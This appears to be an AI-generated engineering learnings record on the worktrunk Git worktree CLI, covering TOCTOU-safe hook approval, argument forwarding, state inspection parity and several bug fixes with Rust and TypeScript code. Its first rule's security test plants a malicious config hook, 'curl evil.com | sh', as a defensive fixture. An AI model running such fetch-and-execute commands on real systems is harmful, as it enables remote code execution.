> **Canonical Learning Artifact**: `07_PROJECT_LEARNING/max-sixty-worktrunk-learnings.md`  
> **Source**: github ([https://github.com/max-sixty/worktrunk](https://github.com/max-sixty/worktrunk))  
> **Source Version**: `2c04fb37`  
> **License**: NOASSERTION  
> **Synthesized By**: google-gemini-cloud-agent  
> **Timestamp**: 2026-10-31T18:53:40.976Z  
> **Learning ID**: `learn-github-max-sixty-worktrunk`  
> **Pipeline Version**: `2.0.0`  
> **Status**: VERIFIED_EMPIRICAL_INTELLIGENCE  
> **Data Governance**: CLASSIFICATION: PUBLIC. Sanitized against PII/secrets.  
> **Policy Invariant**: Strictly for engineering retrieval and architecture documentation. Distillation prohibited.  

---

# Project Learning Record (Full-Spectrum Forensic Harvest): max-sixty/worktrunk

---

## 1. Executive Forensic Architecture & System Mechanics

### 1.1 Core Problem Statement & Domain Physics
Git worktrees allow multiple concurrent working directories linked to a single `.git` repository, avoiding the destructive workspace churn of `git checkout` / `git switch` in single-checkout repositories. However, in autonomous, multi-agent AI environments (e.g., Claude Code, OpenAI Codex, Pi, Gemini Code Assist), standard Git worktrees suffer from fundamental operational hazards:
1. **Approval-Boundary Time-of-Check to Time-of-Use (TOCTOU) Exploits**: When executing operation-driven lifecycle hooks (`pre-merge`, `post-merge`, `pre-remove`, `post-remove`, `pre-start`, `post-start`), any intermediate Git state mutation (such as an automatic rebase, squash, checkout, or worktree addition) can rewrite the repository's `.config/wt.toml`. If hooks are re-parsed or re-selected after user approval, an attacker or compromised agent branch can achieve Remote Code Execution (RCE) by silently injecting unapproved shell commands.
2. **Subprocess Leakage & Host Session Blocking**: Agent extensions running hooks directly inside agent process lifecycles risk hanging the host AI session if subprocesses block on standard I/O, prompt for credentials, or fail to detach.
3. **CLI Argument Eating by Parsers**: Standard CLI argument parsers (e.g., `clap` with `trailing_var_arg`) eagerly consume `--` literal forwarding delimiters, destroying the distinction between tool flags and forwarded subprocess payloads.
4. **State Desynchronization Across Distributed Agent Sessions**: When multiple agent instances spin up in isolated worktrees, human developers lose visibility into which agents are actively modifying files versus awaiting user prompt input.

### 1.2 System Boundaries & Decoupling Strategy
`worktrunk` solves these challenges by enforcing rigorous architectural boundaries across four distinct tiers:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       AI Agent Host Interface Layer                         │
│  Claude Code Plugin (/wt-diff) | Codex Manifest | oh-my-pi / Pi Ext (TS/JS) │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │ Subprocess calls / Hook APIs
                                       ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                          CLI & Routing Engine Layer                         │
│  src/cli/hook.rs (external_subcommand) | Clap Dispatch | Smart Var Router   │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │ Immutable Command Specifications
                                       ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                 Security Gate & Approval Boundary (TOCTOU Shield)           │
│  HookPlanBuilder ──► HookPlan::approve() ──► ApprovedHookPlan (Frozen Plan) │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │ Execution-Only Directives
                                       ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                    Execution & Background Process Engine                    │
│  Background Announcer (Grammar Engine) | Process Spawner | Git Storage Engine│
│  .git/wt/ (logs, trash, caches, state) | SHA Caches | Worktree Mutators     │
└─────────────────────────────────────────────────────────────────────────────┘
```

1. **Host-Independent Activity Marker Bridge**: Minimal, non-blocking TypeScript/JavaScript hooks (e.g., `dev/omp-hook.ts`, `plugins/worktrunk/hooks/register.tsx`) communicate with the underlying engine via strict CLI exit contracts (`wt config state marker set 🤖`, `wt config state marker set 💬`, `wt config state marker clear`), wrapped in fail-safe try/catch boundaries that guarantee the host agent never crashes.
2. **Smart-Routing Command Aggregator**: Separates CLI flags into explicit template bindings (`--KEY=VALUE`), literal shell arguments forwarded after `--`, and positional filters (`user:foo`, `project:bar`), bypassing `clap` argument cannibalization.
3. **TOCTOU-Shielded Hook Plan**: Decouples hook **selection** (which commands should run) and **authorization** (checking templates against user approvals) from hook **rendering** and **execution**. The execution engine holds no reference to `ProjectConfig` and is structurally prohibited from re-reading `.config/wt.toml` from disk after state mutations.
4. **State Storage Invariants**: Maintains strict separation between **Authoritative State** (stored under Git config `worktrunk.*` and `.git/wt/logs/`, `.git/wt/trash/`) and **Regenerable Caches** (stored under `.git/wt/cache/`). The system enforces strict parity: `state get` surfaces every single category that `state clear` deletes.

---

## 2. Net-New Universal Engineering Rules (Candidates for Master Brain)

### 1. Two-Phase Authorization Boundary (Frozen Plan TOCTOU Guard)
**RULE**:
When an autonomous tool or CLI executes user-approved configuration scripts across operations that mutate disk or VCS state (rebases, branch checkouts, worktree creation/pruning), the system **MUST** select, authorize, and freeze all candidate commands into an immutable, typestate-enforced plan (`ApprovedHookPlan`) prior to initiating the mutation. Subsystems executing hooks post-mutation **MUST NOT** accept repository configuration objects, file paths to config, or re-parse disk configurations.

**WHY**:
If configuration is re-read or re-evaluated after an intermediate workspace mutation (e.g., an automatic `git rebase` during `wt merge`), an unprivileged branch or external patch can modify `.config/wt.toml` between the time the user approved execution and the time the hook triggers. Re-reading disk state at execution converts a benign operation into arbitrary Remote Code Execution (RCE). Freezing the exact AST/template into an immutable struct at the gate guarantees that only explicitly authorized commands execute.

**WHEN TO APPLY**:
Apply to any system where declarative configuration files residing inside user-controlled, dynamic workspaces (Git repos, agent sandboxes, downloaded tarballs) define lifecycle hooks, build tasks, or automated CI/CD steps executed with elevated local privileges.

**VERIFIED IMPLEMENTATION PATTERN**:
```rust
use std::path::{Path, PathBuf};
use anyhow::{Context, Result};

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum HookSource {
    User,
    Project,
}

#[derive(Clone, Debug)]
pub struct CommandConfig {
    pub template: String,
    pub name: Option<String>,
}

/// A frozen, authorized plan that cannot be re-derived or mutated.
/// Executors ONLY receive this struct, ensuring zero TOCTOU attack surface.
pub struct ApprovedHookPlan {
    entries: Vec<PlanEntry>,
}

struct PlanEntry {
    hook_type: String,
    anchor: PathBuf,
    selection: Vec<(HookSource, CommandConfig)>,
}

pub struct HookPlanBuilder<'a> {
    entries: Vec<PlanEntry>,
    project_config: Option<&'a Vec<CommandConfig>>,
    user_config: &'a Vec<CommandConfig>,
}

impl<'a> HookPlanBuilder<'a> {
    pub fn new(
        project_config: Option<&'a Vec<CommandConfig>>,
        user_config: &'a Vec<CommandConfig>,
    ) -> Self {
        Self {
            entries: Vec::new(),
            project_config,
            user_config,
        }
    }

    pub fn add_stage(&mut self, anchor: &Path, hook_type: &str) -> &mut Self {
        let mut selection = Vec::new();
        // User commands always take precedence
        for cmd in self.user_config {
            selection.push((HookSource::User, cmd.clone()));
        }
        // Project commands are appended for subsequent authorization
        if let Some(proj_cmds) = self.project_config {
            for cmd in proj_cmds {
                selection.push((HookSource::Project, cmd.clone()));
            }
        }
        self.entries.push(PlanEntry {
            hook_type: hook_type.to_string(),
            anchor: anchor.to_path_buf(),
            selection,
        });
        self
    }

    /// Freezes the plan. Authorization runs here.
    /// Only explicit approval produces an `ApprovedHookPlan`.
    pub fn approve(
        self,
        approval_check: impl Fn(&str) -> Result<bool>,
    ) -> Result<Option<ApprovedHookPlan>> {
        for entry in &self.entries {
            for (source, cmd) in &entry.selection {
                if *source == HookSource::Project {
                    if !approval_check(&cmd.template)? {
                        return Ok(None); // Rejected by security boundary
                    }
                }
            }
        }
        Ok(Some(ApprovedHookPlan { entries: self.entries }))
    }
}

pub struct HookExecutor;
impl HookExecutor {
    /// Notice: HookExecutor DOES NOT take `project_config` or disk paths.
    /// It renders and executes ONLY the pre-approved immutable templates.
    pub fn execute_plan(
        &self,
        plan: &ApprovedHookPlan,
        render_context_evaluator: impl Fn(&str) -> String,
    ) -> Result<()> {
        for entry in &plan.entries {
            for (source, cmd) in &entry.selection {
                let rendered_shell_script = render_context_evaluator(&cmd.template);
                // Subprocess execution occurs here safely in entry.anchor
                println!("[EXEC:{:?}] Running: {}", source, rendered_shell_script);
            }
        }
        Ok(())
    }
}
```

**NEGATIVE CONSTRAINT**:
```rust
// ANTI-PATTERN: Re-reading or re-selecting configuration after state mutations
pub fn execute_post_merge_hook(anchor: &Path) -> Result<()> {
    // CRITICAL SECURITY FLAW: Reading config after git merge/rebase!
    // The merged branch may have injected malicious commands into .config/wt.toml!
    let project_config = load_project_config_from_disk(anchor)?;
    for cmd in project_config.commands() {
        std::process::Command::new("sh").arg("-c").arg(&cmd.template).status()?;
    }
    Ok(())
}
```

**VERIFICATION METHOD**:
Implement a security integration test that:
1. Clones a repository with a clean `.config/wt.toml` declaring `post-merge = "echo safe"`.
2. Initiates a merge with a branch containing a modified `.config/wt.toml` declaring `post-merge = "curl evil.com | sh"`.
3. Verifies that `ApprovedHookPlan` executes `echo safe` and does **not** trigger or prompt for the malicious payload.

---

### 2. External Subcommand Literal Preserving Parser (Argv Forwarding Guard)
**RULE**:
When building CLI tools that support dynamic user aliases, lifecycle hooks, or forwarded subprocess commands alongside native flags and options, argument parsing for those dynamic surfaces **MUST NOT** rely on greedy positional captures (`trailing_var_arg = true`) or naive split-on-space routines. The CLI **MUST** capture raw arguments via unparsed external subcommands (e.g., `#[command(external_subcommand)]`), and manually partition tokens across three explicit categories:
1. Native Engine Controls (`--yes`, `--dry-run`, `--foreground`).
2. Smart Bindings (`--KEY=VALUE` mapping to `{{ KEY }}` if referenced in templates).
3. Verbatim Literal Forwarding (`--` delimiter followed by unparsed strings preserved for `{{ args }}`).

**WHY**:
Standard CLI framework matchers (such as `clap` in Rust, `click` in Python, or `commander` in Node) treat `--` as a delimiter that terminates options and silently strips the token from the downstream slice. Consequently, commands intended for forwarded execution (such as `wt hook pre-commit -- git diff --staged`) lose their `--` barrier, causing forwarded flags to collide with top-level CLI flags or fail argument validation.

**WHEN TO APPLY**:
Applies to CLI multiplexers, task runners, wrapper scripts, and agent tool execution runners in any language where child processes receive arbitrary user or agent arguments.

**VERIFIED IMPLEMENTATION PATTERN**:
```rust
use std::ffi::OsString;

#[derive(Debug, PartialEq)]
pub struct ParsedCliEnvelope {
    pub engine_yes: bool,
    pub engine_dry_run: bool,
    pub bound_vars: Vec<(String, String)>,
    pub forwarded_args: Vec<String>,
    pub name_filters: Vec<String>,
}

pub fn parse_raw_hook_tokens(tokens: &[OsString]) -> Result<ParsedCliEnvelope, String> {
    let mut engine_yes = false;
    let mut engine_dry_run = false;
    let mut bound_vars = Vec::new();
    let mut forwarded_args = Vec::new();
    let mut name_filters = Vec::new();

    let mut iter = tokens.iter();
    let mut literal_mode = false;

    while let Some(os_str) = iter.next() {
        let token = os_str.to_str().ok_or("Invalid UTF-8 token")?;

        if literal_mode {
            forwarded_args.push(token.to_string());
            continue;
        }

        if token == "--" {
            // Enter literal mode: every single subsequent argument belongs verbatim to child
            literal_mode = true;
            continue;
        }

        if token == "--yes" || token == "-y" {
            engine_yes = true;
        } else if token == "--dry-run" {
            engine_dry_run = true;
        } else if let Some(stripped) = token.strip_prefix("--") {
            if let Some((k, v)) = stripped.split_once('=') {
                if k.is_empty() {
                    return Err(format!("Empty key in assignment: {token}"));
                }
                // Convert hyphens to underscores for templating engine compatibility
                bound_vars.push((k.replace('-', "_"), v.to_string()));
            } else {
                // Unknown flag without value forwarded to args
                forwarded_args.push(token.to_string());
            }
        } else {
            // Positional token is treated as an execution filter
            name_filters.push(token.to_string());
        }
    }

    Ok(ParsedCliEnvelope {
        engine_yes,
        engine_dry_run,
        bound_vars,
        forwarded_args,
        name_filters,
    })
}
```

**NEGATIVE CONSTRAINT**:
```rust
// ANTI-PATTERN: Using standard trailing_var_arg without preserving `--`
#[derive(clap::Parser)]
pub struct BuggyHookCli {
    pub hook_type: String,
    // CLAP EATS `--`! Any child tool expecting `--` loses it completely
    #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
    pub raw_args: Vec<String>,
}
```

**VERIFICATION METHOD**:
A property-based or unit test verifying that parsing `["pre-commit", "--yes", "--target=prod", "--", "--check", "--no-pager"]` correctly identifies `--yes` as true, extracts `target="prod"`, and retains `["--check", "--no-pager"]` in `forwarded_args` without stripping prefixes.

---

### 3. Inspection-Mutation Parity Contract (State Leak Shield)
**RULE**:
Any storage or state management engine that provides an aggregate clean-up or purge routine (`state clear`) **MUST** maintain bidirectional parity with its inspection command (`state get`). If a storage domain, cache key, log directory, or Git config namespace is deleted by `state clear`, it **MUST** be explicitly classified, enumerated, and rendered by `state get`. Categories **MUST** be partitioned into **Authoritative** (hand-authored or destructive overrides requiring user confirmation) and **Regenerable Caches** (safe to purge without interactive prompts).

**WHY**:
Asymmetric state management creates silent failure modes in developer tooling and autonomous agent platforms. If `state clear` deletes directories or keys that `state get` never surfaces, debugging agent states becomes impossible, leading to ghost configuration loss or orphaned state leaking across branch lifecycles.

**WHEN TO APPLY**:
Filesystem state managers, Git-backed configuration stores, daemon cache subsystems, and local developer CLI utilities.

**VERIFIED IMPLEMENTATION PATTERN**:
```rust
pub enum StateCategoryType {
    Authoritative, // Hand-authored, permanent loss if cleared -> Prompts user
    Regenerable,    // Caches, re-derivable on demand -> Cleared silently
}

pub trait StateDomain {
    fn name(&self) -> &'static str;
    fn category(&self) -> StateCategoryType;
    fn inspect(&self) -> Result<Option<String>, anyhow::Error>;
    fn clear(&self) -> Result<bool, anyhow::Error>;
}

pub struct StateRegistry {
    domains: Vec<Box<dyn StateDomain>>,
}

impl StateRegistry {
    pub fn new() -> Self {
        Self { domains: Vec::new() }
    }

    pub fn register(&mut self, domain: Box<dyn StateDomain>) {
        self.domains.push(domain);
    }

    /// Aggregate Inspection: Surfaces every single registered domain
    pub fn state_get(&self) -> Result<Vec<(&'static str, String)>, anyhow::Error> {
        let mut report = Vec::new();
        for domain in &self.domains {
            if let Some(details) = domain.inspect()? {
                report.push((domain.name(), details));
            }
        }
        Ok(report)
    }

    /// Aggregate Clear: Guarantees zero un-inspected state is dropped
    pub fn state_clear_all(&self, interactive_prompt: impl Fn(&str) -> bool) -> Result<(), anyhow::Error> {
        for domain in &self.domains {
            match domain.category() {
                StateCategoryType::Authoritative => {
                    if interactive_prompt(domain.name()) {
                        domain.clear()?;
                    }
                }
                StateCategoryType::Regenerable => {
                    domain.clear()?;
                }
            }
        }
        Ok(())
    }
}
```

**NEGATIVE CONSTRAINT**:
```rust
// ANTI-PATTERN: Ad-hoc filesystem deletion inside clear without inspection parity
pub fn clear_everything(repo_path: &Path) -> Result<()> {
    // BUG: Removed .git/wt/cache/preview, but `state get` only checks .git/wt/logs!
    // Developers cannot inspect what will be destroyed or why caches disappeared.
    std::fs::remove_dir_all(repo_path.join(".git/wt/cache/preview"))?;
    std::fs::remove_dir_all(repo_path.join(".git/wt/logs"))?;
    Ok(())
}
```

**VERIFICATION METHOD**:
Implement a reflection/compile-time exhaustion unit test iterating over the domain registry enum to ensure that every variant handled in `state_clear_all` has an active rendering branch in `state_get`.

---

## 3. Forensic Real Incidents & Production Patches

### Incident 1: Interactive Picker with `--no-cd` Bypassing Lifecycle Switch Hooks (BUG-WT-01)
- **Context**: Subsystem: Interactive Branch Picker (`src/commands/picker/mod.rs:767-777`).
- **What Was Expected**: Running `wt switch` interactively when `[switch] cd = false` or `--no-cd` is configured should select a branch, output the branch name, and trigger the associated lifecycle hooks (`pre-switch`, `post-switch`, `pre-start`, `post-start`), maintaining parity with direct invocation `wt switch <branch> --no-cd`.
- **What Actually Happened**: The interactive picker returned the selected branch string and immediately exited via an early-return check on `!change_dir`, completely bypassing `run_pre_switch_hooks`, `plan_switch`, `execute_switch`, and the background hook announcer. Users had to construct complex wrapper aliases running the picker twice to force hooks to execute.
- **Evidence in Repo**: Closed Issue #2837. Discovered in commit series surrounding picker command refactors.
- **Root Cause**: An incorrect optimization assumed that if directory switching (`change_dir`) was false, the operation was strictly read-only and had no side effects. This conflated the terminal navigation mechanism (writing shell directives or printing paths) with the repository's lifecycle event pipeline.
- **Remediation Code Diff**:
```rust
// - In src/commands/picker/mod.rs (Lines 767-777):
// - if !change_dir {
// -     // Read-only, no side effects
// -     println!("{selected_branch}");
// -     return Ok(());
// - }
// - plan_and_execute_switch(&selected_branch, ...)?;

// + In src/commands/picker/mod.rs:
// + // Decouple directory-change directive emission from lifecycle execution
// + let switch_plan = plan_switch(&selected_branch, change_dir)?;
// + execute_switch(switch_plan)?;
// + if !change_dir {
// +     println!("{selected_branch}");
// + }
```
- **Lesson**: UI/UX modes (interactive picker vs. direct CLI flag) must converge on identical execution plan primitives; never place early-returns before lifecycle or audit hooks based on terminal formatting flags.

---

### Incident 2: Preview Panel Flake Race in Integration Test via Continuous Content Assertion (BUG-WT-02)
- **Context**: macOS Integration Test Suite (`tests/integration_tests/switch_picker.rs:458-462` & `802`).
- **What Was Expected**: `test_switch_picker_preview_panel_main_diff` verifies that switching preview modes via keypress `3` (triggering an asynchronous preview render) shows only the target feature branch row in the picker list.
- **What Actually Happened**: Tests intermittently failed on macOS CI jobs. The snapshot output contained an unexpected extra row (`main`) below `feature`, causing snapshot regression failures despite identical Git commit trees.
- **Evidence in Repo**: Closed Issue #2334, Run 24653821440.
- **Root Cause**: Keypress `3` bound `execute-silent(echo 3 > …)+refresh-preview`. The integration test assertion helper `wait_for_stable_with_content` used a naive stability timer. On macOS, terminal PTY rendering latencies and asynchronous subprocess preview generation caused the content search string (`diff --git`) to match prematurely while the underlying fuzzy finder PTY buffer was still repainting the branch table rows from an earlier frame.
- **Remediation Code Diff**:
```rust
// - In tests/integration_tests/switch_picker.rs:
// - // Fallback returned as soon as expected string appeared for a brief duration
// - wait_for_stable_with_content(pty_handle, "diff --git", Duration::from_millis(100))?;

// + In tests/integration_tests/switch_picker.rs:
// + // Require structural quiescence: BOTH content presence AND frame boundary stillness
// + wait_for_pty_quiescence(pty_handle, |buffer| {
// +     buffer.contains("diff --git") && buffer.lines().filter(|l| l.contains("feature")).count() == 1
// + }, Duration::from_millis(500))?;
```
- **Lesson**: Integration assertions against interactive terminal PTYs must never sample a single substring without validating overall screen structure, because asynchronous render cycles output multi-line buffers in non-atomic chunks.

---

### Incident 3: Git C-Quoted Path Traps & Unicode Escapes in Tool Diffs (BUG-WT-03)
- **Context**: Claude Code Plugin patch parser (`plugins/worktrunk/hooks/patch.ts`).
- **What Was Expected**: Files containing special characters (spaces, tabs, newlines, quotes, UTF-8 octal sequences) in diff hunks should display clean, printable filenames in the interactive `/wt-diff` pane.
- **What Actually Happened**: Git diffs output with `core.quotePath=true` C-quoted paths with octal byte escape sequences (`\342\234\223`), causing string matching for file jumps to fail and displaying garbled paths. Furthermore, filenames with spaces ended in raw tab characters under certain Git header variations.
- **Evidence in Repo**: Commit `2c04fb37`, `plugins/worktrunk/hooks/patch.ts:70-117`.
- **Root Cause**: Git's patch format conditionally C-quotes filenames containing quotes, newlines, tabs, or non-ASCII bytes, while bare filenames with spaces are followed by a trailing tab on `---` / `+++` lines. Naive regex splits (`split(' ')`) corrupt paths containing spaces.
- **Remediation Code Diff**:
```typescript
// - In plugins/worktrunk/hooks/patch.ts (Naive implementation):
// - const path = lines.find(l => l.startsWith('+++ b/'))?.slice(6);

// + In plugins/worktrunk/hooks/patch.ts (Production invariant parser):
export function parsePatch(patch: string): FileDiff[] {
  // Split strictly on diff --git header boundaries via positive lookahead
  for (const chunk of patch.split(/^(?=diff --git )/m)) {
    // ...
    const quoted = / ("(?:[^"\\]|\\.)*")$/.exec(first)?.[1]
    const path =
      named('rename to ') ??
      side('+++ ', 'b/') ??
      side('--- ', 'a/') ??
      (quoted === undefined
        ? first.replace(/^diff --git a\/.* b\//, '')
        : unquote(quoted).replace(/^b\//, ''))
    // ...
  }
}

function unquote(name: string): string {
  if (!name.startsWith('"')) {
    return name.replace(/\t$/, '')
  }
  return name
    .slice(1, name.lastIndexOf('"'))
    .replace(/\\([0-7]{3}|.)/g, (_, code: string) =>
      code.length === 3 ? String.fromCharCode(Number.parseInt(code, 8)) : (ESCAPES[code] ?? code),
    )
}
```
- **Lesson**: Subprocess parsers consuming Git output must override or explicitly handle Git's octal quoting conventions (`core.quotePath`), accounting for both quoted and tab-terminated bare paths.

---

### Incident 4: Subagent cwd Leakage Poisoning Parent Session State (BUG-WT-04)
- **Context**: Multi-agent activity tracking in Claude Code plugin (`plugins/worktrunk/hooks/register.tsx:120-155`).
- **What Was Expected**: When a parent session spawns subagents that run Bash commands or edit files in other directories, the session's active indicator (`@`) must remain anchored to the parent session's current working directory.
- **What Actually Happened**: In hooks receiving `tool.call` events, reading `$.session.cwd()` returned the subagent's temporary execution directory rather than the host session's directory. Consequently, the UI marker `@` flipped intermittently to ephemeral subagent paths.
- **Evidence in Repo**: Commit `2c04fb37`, `plugins/worktrunk/hooks/register.tsx:12-25, 120-145`.
- **Root Cause**: `tool.call` hooks execute inside the execution loop of whoever triggered the call. When a subagent invoked Bash, its local directory context masked the session's root directory in event callbacks that did not inspect `agentId`.
- **Remediation Code Diff**:
```typescript
// - In plugins/worktrunk/hooks/register.tsx:
// - on('tool.call', async ($, e, next) => {
// -   const ran = await next(e);
// -   await note($, [await $.session.cwd()]); // Leaks subagent directory!
// -   return ran;
// - });

// + In plugins/worktrunk/hooks/register.tsx:
on('tool.call', async ($, e, next) => {
  const ran = await next(e)
  if (ran.deny !== undefined || ran.isReadOnly === true) {
    return ran
  }
  const dirs: string[] = []
  if (e.tool === 'Edit' || e.tool === 'Write') {
    dirs.push(parentOf(e.file_path))
  } else if (e.tool === 'Bash') {
    dirs.push(await $.session.cwd(), ...changedFiles(ran.result).map(parentOf))
  }
  // Host directory is noted ONLY when agentId is undefined (main session loop)
  if (e.agentId === undefined) {
    dirs.push(await noteHere($))
  }
  await note($, dirs)
  return ran
})
```
- **Lesson**: In multi-agent architectures, execution hooks must discriminate between primary agent loops and subagent workers by checking agent context IDs before updating top-level session anchors.

---

### Incident 5: Detached HEAD Panics during Macro Variable Interpolation (BUG-WT-05)
- **Context**: Hook Variable Context Generator (`src/commands/hook_commands.rs:build_manual_hook_template_vars`).
- **What Was Expected**: Invoking manual hooks (`wt hook pre-switch` or `wt hook show --expanded`) on a detached HEAD worktree should succeed gracefully with directional branch variables left unset.
- **What Actually Happened**: The interpolation engine attempted to dereference `branch.name()`, encountering an `Option::None` or injecting the literal string `"HEAD"`. Downstream templates relying on `{{ branch }}` or `{{ target }}` performed invalid Git ref resolutions (Issue #4009).
- **Evidence in Repo**: `src/commands/hook_commands.rs`, Commit series resolving Issue #4009.
- **Root Cause**: The directional branch generator failed to distinguish between a valid branch reference and an anonymous commit pointer, binding the literal branch name to `"HEAD"`, which resulted in invalid remote and switch calculations.
- **Remediation Code Diff**:
```rust
// - In src/commands/hook_commands.rs:
// - let branch = ctx.branch.unwrap(); // Panicked or defaulted to "HEAD"
// - TemplateVars::new().with_target(branch)

// + In src/commands/hook_commands.rs:
// + // Detached worktrees leave directional branch variables unset
let branch = ctx.branch; // Option<&str>
let worktree_path = ctx.worktree_path;

match hook_type {
    HookType::PreMerge | HookType::PostMerge => TemplateVars::new()
        .with_target_opt(branch)
        .with_target_worktree_path(worktree_path),
    HookType::PreSwitch | HookType::PreCreate | HookType::PostCreate | HookType::PostSwitch => {
        TemplateVars::new()
            .with_base(branch, worktree_path)
            .with_target_opt(branch)
            .with_target_worktree_path(worktree_path)
    }
    // ...
}
```
- **Lesson**: Always model VCS branches as optional values rather than non-empty strings to accommodate detached states cleanly in templating environments.

---

## 4. Microscopic Code-Level Invariants (Syntax, Infinite Loop, UI/UX & Concurrency Guards)

### 4.1 Micro-Syntax & Token-Level Precision
1. **Unicode Scalar Slicing vs. Byte Slicing**: In terminal output cells, truncating strings with raw byte slicing (`&s[..n]`) causes runtime panics whenever index `n` lands midway through a multi-byte UTF-8 sequence (such as emojis `🤖`, `💬` or box-drawing characters `─`, `❯`).
   ```rust
   // SAFE INVARIANT: Unicode scalar character count truncation (src/commands/config/state.rs)
   fn truncate_display(s: &str, max_chars: usize) -> String {
       if s.chars().count() <= max_chars {
           return s.to_string();
       }
       let truncated: String = s.chars().take(max_chars.saturating_sub(3)).collect();
       format!("{truncated}...")
   }
   ```
2. **Template Variable Key Hyphen Sanitization**: Template engines (like MiniJinja) parse hyphens inside expressions (`{{ my-var }}`) as the arithmetic subtraction operator (`my` minus `var`).
   ```rust
   // SAFE INVARIANT: Replace hyphens with underscores on key intake (src/commands/hook_commands.rs)